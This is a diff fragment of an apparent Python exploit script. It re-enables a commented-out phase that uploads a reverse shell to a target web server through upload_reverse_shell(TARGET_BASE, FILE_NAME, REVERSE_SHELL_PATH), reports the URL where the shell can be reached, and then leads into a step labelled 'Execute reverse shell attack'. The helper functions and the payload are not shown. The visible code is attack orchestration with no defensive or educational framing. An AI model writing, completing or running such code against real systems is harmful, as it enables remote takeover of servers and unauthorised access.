@@ -600,21 +600,21 @@ if __name__ == "__main__":
     # time.sleep(5)
     
     # === Step 3: Upload reverse shell ===
-    # print("\n" + "="*60)
-    # print("[PHASE 3] UPLOADING REVERSE SHELL")
-    # print("="*60)
+    print("\n" + "="*60)
+    print("[PHASE 3] UPLOADING REVERSE SHELL")
+    print("="*60)
     
-    # success, uploaded_path = upload_reverse_shell(TARGET_BASE, FILE_NAME, REVERSE_SHELL_PATH)
+    success, uploaded_path = upload_reverse_shell(TARGET_BASE, FILE_NAME, REVERSE_SHELL_PATH)
     
-    # if success and uploaded_path:
-    #     TARGET_URL = f"{TARGET_BASE}/{uploaded_path}"
-    #     print(f"[+] File accessible at: {TARGET_URL}")
-    # elif success:
-    #     print(f"[+] File should be at: {TARGET_URL}")
-    # else:
-    #     print("[-] Upload failed - continuing anyway...")
+    if success and uploaded_path:
+        TARGET_URL = f"{TARGET_BASE}/{uploaded_path}"
+        print(f"[+] File accessible at: {TARGET_URL}")
+    elif success:
+        print(f"[+] File should be at: {TARGET_URL}")
+    else:
+        print("[-] Upload failed - continuing anyway...")
     
-    # time.sleep(3)
+    time.sleep(3)
     
     # === Step 4: Execute reverse shell attack ===
     print("\n" + "="*60)
